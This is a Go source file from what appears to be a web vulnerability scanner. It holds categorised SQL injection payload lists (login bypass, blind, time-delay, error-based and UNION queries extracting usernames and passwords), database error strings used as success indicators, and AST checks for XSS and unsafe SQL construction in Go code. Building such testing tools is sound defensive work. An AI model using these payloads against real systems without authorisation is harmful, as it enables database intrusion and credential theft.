package types

import (
	"fmt"
	"go/ast"
	"go/parser"
	"go/token"
	"io/fs"
	"log"
	"os"
	"path/filepath"
	"strings"
	"time"
)

type Vulnerability struct {
	Name        string
	Description string
	File        string
	// Line  int
	Line token.Pos
}

type SqliReport struct {
	Endpoint     string
	StatusCode   int
	ResponseTime time.Duration
	Payload      string
	PayloadCat   string
	Success      bool
}

var AllSqlPayloads = SqlPayloads()

// basic SQL payloads often used for bypassing authentication fields
var SqlBypassPayloads = []string{
	// "' OR '1'='1",
	"' OR '1'='1' -- ",
	"' OR '1'='1' /*",
	"admin' --",
	"admin' #",
	"admin'/*",
	"' OR 1=1 --",
	"' OR 1=1 #",
	// "' OR 1=1/*",
	// "OR 1=1",
	// "'='",
}

// payloads designed to leverage SQL functions and operators to extract information
var SqlFunctionPayloads = []string{
	"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 64 --",
	"' AND LENGTH((SELECT USER())) > 1 --",
	"' AND ASCII(SUBSTRING((SELECT VERSION()), 1, 1)) > 52 --",
	"' AND ORD(MID((SELECT SCHEMA_NAME FROM information_schema.schemata LIMIT 1), 1, 1)) > 64 --",
}

// payloads testing for SQL injection by observing delays in responses.
var SqlTimePayloads = []string{
	"'; WAITFOR DELAY '0:0:5' --",
	"'; IF (1=1) WAITFOR DELAY '0:0:5' --",
	// "'; IF (1=2) WAITFOR DELAY '0:0:5' --",
	"' AND pg_sleep(5) --",     // For PostgreSQL
	"'; SELECT pg_sleep(5) --", // For PostgreSQL
	"' AND SLEEP(5) --",        // For MySQL
	"' OR SLEEP(5) --",         // For MySQL
}

// payloads used when there is no visible error message
var SqlBlindPayloads = []string{
	"' AND 1=1 --",
	// "' AND 1=2 --",
	// "' OR SLEEP(5) --",
	"' AND IF(1=1, SLEEP(5), 0) --",
	"' AND IF(1=2, SLEEP(5), 0) --",
	"' OR 1=1 LIMIT 1 --",
	"' OR 1=0 LIMIT 1 --",
}

// payloads attempting to force the server to return SQL error messages, revealing information about the database structure.
var SqlErrorPayloads = []string{
	"' AND 1=CONVERT(int, (SELECT @@version)) --",
	"' AND 1=CONVERT(int, (SELECT USER())) --",
	"' AND 1=CONVERT(int, (SELECT database())) --",
	"' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables)) --",
}

// payloads trying to leverage SQL's UNION operator to return data from other tables
var SqlUnionPayloads = []string{
	"' UNION SELECT NULL, NULL -- ",
	// "' UNION SELECT NULL, NULL, NULL -- ",
	"' UNION SELECT 1, 'anotheruser', 'password' -- ",
	"' UNION SELECT username, password FROM users --",
	"' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --",
	"' UNION SELECT table_name FROM information_schema.tables --",
}

var SqliSuccessIndicators = []string{
	// MySQL Error Messages
	"You have an error in your SQL syntax",
	"Warning: mysql_",
	"Unknown column",
	"MySQL server version for the right syntax",
	"Unclosed quotation mark",
	"check the manual that corresponds to your MySQL server version",

	// PostgreSQL Error Messages
	"ERROR: syntax error at or near",
	"unterminated quoted string",
	"invalid input syntax",
	"permission denied for relation",
	"function does not exist",

	// SQL Server (MSSQL) Error Messages
	"Unclosed quotation mark after the character string",
	"Incorrect syntax near",
	"Procedure expects parameter",
	"Warning: mssql_query()",
	"Syntax error in string in query expression",
	"Invalid column name",

	// Oracle Error Messages
	"ORA-00933: SQL command not properly ended",
	"ORA-01756: quoted string not properly terminated",
	"ORA-06512: at line",
	"ORA-00942: table or view does not exist",
	"ORA-00904: invalid identifier",

	// SQLite Error Messages
	"SQLite3::SQLException",
	"unrecognized token",
	"no such table",
	"SQLite error",

	// Behavioral Indicators
	"syntax error",
	"unterminated",
	"invalid query",
	"missing operator",
	"unexpected token",
	"stack trace",
	"server error",
	"internal server error",
	"forbidden",
	"404 error",
	"unexpected response body",
	"permission denied",
	"operation not allowed",
	"function not supported",
	"database error",
	"unusual response",
}

func CheckForSqliIndicators(responseBody string, statusCode int) bool {
	for _, indicator := range SqliSuccessIndicators {
		if strings.Contains(responseBody, indicator) {
			return true // SQL injection possibly successful
		}
	}
	if statusCode == 500 || statusCode == 403 {
		return true
	}
	return false // No indicators found
}

func GetGoFiles(root string) ([]string, error) {
	var goFiles []string
	err := filepath.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if !d.IsDir() && (filepath.Ext(d.Name()) == ".go") && !strings.Contains(d.Name(), "_test.go") && !strings.Contains(d.Name(), "_simulation.go") && !strings.Contains(d.Name(), "_scan.go") {
			goFiles = append(goFiles, path)
		}
		return nil
	})
	return goFiles, err
}

func ParseGoFiles(filePath string) (*ast.File, error) {
	fset := token.NewFileSet()
	// parse the go file
	node, err := parser.ParseFile(fset, filePath, nil, parser.AllErrors)
	if err != nil {
		return nil, fmt.Errorf("Error parsing the %s file: %v\n", filePath, err)
	}

	if node == nil {
		return nil, fmt.Errorf("Parsed file got nil nodes: %s; report: %v\n", filePath, err)
	}
	// Print the AST (for debugging purposes)
	fmt.Printf("Parsed AST for %s:\n", filePath)

	// Possible ast printing of the files for debugging
	// ast.Print(fset, node)
	return node, err
}

func IsUserControlledInput(expr ast.Expr) bool {
	fmt.Println("Running the IsUserControlledInput function from checking for xss possibilities")
	switch e := expr.(type) {
	case *ast.SelectorExpr:
		fmt.Println("It is selector expression")
		// if ident, ok := e.X.(*ast.Ident); ok && (ident.Name == "req" || ident.Name == "r") {
		if ident, ok := e.X.(*ast.Ident); ok {
			fmt.Println(ident.Name)
			if e.Sel.Name == "FormValue" || e.Sel.Name == "Query" || e.Sel.Name == "Body" || e.Sel.Name == "PostForm" {
				return true
			}
		}
	case *ast.CallExpr:
		fmt.Println("It is call expression")
		if fun, ok := e.Fun.(*ast.SelectorExpr); ok {
			if pkg, ok := fun.X.(*ast.Ident); ok && (pkg.Name == "r" || pkg.Name == "req" || pkg.Name == "request") && (fun.Sel.Name == "Query" || fun.Sel.Name == "FormValue" || fun.Sel.Name == "Body" || fun.Sel.Name == "PostForm") {
				return true
			}
		}
	}
	return false
}

func IsSanitizedUserInput(expr ast.Expr) bool {
	switch e := expr.(type) {
	case *ast.CallExpr:
		if fun, ok := e.Fun.(*ast.SelectorExpr); ok {
			if pkg, ok := fun.X.(*ast.Ident); ok && (pkg.Name == "html" && fun.Sel.Name == "EscapeString") || (pkg.Name == "url" && fun.Sel.Name == "QueryEscape" || fun.Sel.Name == "PathEscape") || (pkg.Name == "strings" && fun.Sel.Name == "ReplaceAll") || (pkg.Name == "json" && fun.Sel.Name == "Marshal") {
				return true
			}
		}
	}
	return false
}

func IsRenderingDirectly(call *ast.CallExpr) bool {
	if fun, ok := call.Fun.(*ast.SelectorExpr); ok {
		if ident, ok := fun.X.(*ast.Ident); ok {
			if (ident.Name == "fmt" && (fun.Sel.Name == "Fprintf" || fun.Sel.Name == "Sprintf")) || (ident.Name == "w" && fun.Sel.Name == "Write") {
				return true
			}
		}
	}
	return false
}

// func TestFunc() {
// 	pwd := "1234"
// 	fmt.Fprintf(io.MultiWriter(), pwd)
// }

func UnsafeSqlConstruction(expr ast.Expr) bool {
	switch x := expr.(type) {
	case *ast.CallExpr:
		if fmtFunc, ok := x.Fun.(*ast.SelectorExpr); ok {
			if pkg, ok := fmtFunc.X.(*ast.Ident); ok && pkg.Name == "fmt" && fmtFunc.Sel.Name == "Sprintf" {
				return true
			}
		}
	case *ast.BasicLit:
		if x.Kind == token.STRING && !(strings.Contains(x.Value, "?") || strings.Contains(x.Value, "$")) {
			return true
		}
	case *ast.BinaryExpr:
		if x.Op == token.ADD {
			return true
		}
	}
	return false
}

func SqlPayloads() map[string][]string {
	// var arr []string
	result := make(map[string][]string)

	result["SqlBlindPayloads"] = SqlBlindPayloads
	result["SqlErrorPayloads"] = SqlErrorPayloads
	result["SqlTimePayloads"] = SqlTimePayloads
	result["SqlUnionPayloads"] = SqlUnionPayloads
	result["SqlBypassPayloads"] = SqlBypassPayloads
	result["SqlFunctionsPayloads"] = SqlFunctionPayloads
	// arr = append(arr, SqlBlindPayloads...)
	// arr = append(arr, SqlTimePayloads...)
	// arr = append(arr, SqlErrorPayloads...)
	// arr = append(arr, SqlUnionPayloads...)
	// arr = append(arr, SqlBypassPayloads...)
	// arr = append(arr, SqlFunctionPayloads...)
	// return arr
	return result
}

func SaveReportToFile(report, filename string) {
	file, err := os.Create(filename)
	if err != nil {
		log.Fatalf("Error creating the %s file: %v\n", filename, err)
		return
	}
	defer file.Close()

	_, err = fmt.Fprint(file, report)
	if err != nil {
		log.Fatalf("Error writing to the %s file using Fprintf: %v\n", filename, err)
		return
	}
}
